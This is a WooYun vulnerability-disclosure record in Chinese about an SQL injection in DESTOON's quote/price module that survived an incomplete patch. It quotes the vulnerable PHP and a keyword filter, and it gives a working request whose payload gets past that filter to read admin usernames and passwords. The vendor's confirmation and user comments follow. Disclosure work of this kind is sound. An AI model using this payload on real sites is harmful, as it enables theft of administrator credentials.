{"id": 518, "wybug_id": "wooyun-2014-069468", "wybug_title": "DESTOON 补丁没补好导致的注射", "wybug_corp": "DESTOON", "wybug_author": "Noxxx", "wybug_date": "2014-07-24 14:16", "wybug_open_date": "2014-10-22 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向公众公开  简要描述： 2014-07-22.应该对关键的地方打补 详细说明：  $post = daddslashes(dstripslashes($post)); 打的补丁只是对 修改资料的$post做了daddslashes的措施 但是 注册的时候还是能注册特殊字符的 .找了一处 可以利用的地方\nextract($USER, EXTR_PREFIX_ALL, '');\n//common.inc.php中的初始化（登录）/module/quote/price.inc.php24-28\nif($_userid) $post['company'] = $_company;//这里使用了\t\trequire DT_ROOT.'/module/'.$module.'/price.class.php';\t\t$do = new price;\t\tif($do->pass($post)) {\t\t\t$do->add($post); //进入流程\n price.class.php中\nfunction add($post) {\t\tglobal $MOD, $L;\t\t$post = $this->set($post);\t\t$sqlk = $sqlv = '';\t\tforeach($post as $k=>$v) {\t\t\tif(in_array($k, $this->fields)) { $sqlk .= ','.$k; $sqlv .= \",'$v'\"; } //  遍历数据\t\t}        $sqlk = substr($sqlk, 1);        $sqlv = substr($sqlv, 1);\t\t$this->db->query(\"INSERT INTO {$this->table} ($sqlk) VALUES ($sqlv)\");//进入查询流程\t\t$this->itemid = $this->db->insert_id();\t\t$this->update($this->itemid, $post);\t\t$this->product($this->itemid, $post['pid']);\t\treturn $this->itemid;\t}\n由于有个转义符破坏了单引号所以可以注入 再看他的 strip_sql这个 更新了下 加了个+号但是还是可以绕过的\nfunction strip_sql($string) {\t$match = array(\"/union/i\",\"/where/i\",\"/0x([a-z0-9]{2,})/i\",\"/select([\\s\\*\\/\\-\\(\\+])/i\",\"/update([\\s\\*\\/\\-\\(\\+])/i\",\"/replace([\\s\\*\\/\\-\\(\\+])/i\",\"/delete([\\s\\*\\/\\-\\(\\+])/i\",\"/drop([\\s\\*\\/\\-\\(\\+])/i\",\"/outfile([\\s\\*\\/\\-\\(\\+])/i\",\"/dumpfile([\\s\\*\\/\\-\\(\\+])/i\",\"/load_file[\\s]*\\(/i\",\"/substring[\\s]*\\(/i\",\"/substr[\\s]*\\(/i\",\"/left[\\s]*\\(/i\",\"/concat[\\s]*\\(/i\",\"/concat_ws[\\s]*\\(/i\",\"/ascii[\\s]*\\(/i\",\"/hex[\\s]*\\(/i\",\"/ord[\\s]*\\(/i\",\"/char[\\s]*\\(/i\");\t$replace = array('unio&#110;','wher&#101;','0&#120;\\\\1','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','outfil&#101;\\\\1','dumpfil&#101;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','lef&#116;(','conca&#116;(','concat_w&#115;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($match, $replace, $string);}\n(SELECT@pw:=PW FROM(SELECT@p:=(MAKE_SET(-1,admin,username,PASSWORD)) AS PW FROM destoon_member ORDER BY admin DESC ) C LIMIT 0,1)这样就绕过了这个就是 必须有产品报价 才行itemid = 产品报价idexp:注册一个账号 然后拦截注册的post数据 把company 改成 xxxx\\登录状态http://x.com/quote/price.phpitemid=1&post[market]=1&post[price]=50&post[areaid]=1&post[company]=ok&post[note]=,(SELECT@pw:=PW FROM(SELECT@p:=(MAKE_SET(-1,admin,username,PASSWORD)) AS PW FROM destoon_member ORDER BY admin DESC ) C LIMIT 0,1),1,3,1,1,1,1,1)#&captcha=rs8h&submit=ok   漏洞证明：  \n\n\n\n\n\n   修复方案：  ..   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-07-25 18:47 厂商回复： 感谢反馈，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-24 15:14 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  又桶一刀    \n     2014-07-24 15:51 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  WooYun-2014-55593？    \n     2014-10-22 14:30 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  好多￥￥￥啊！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}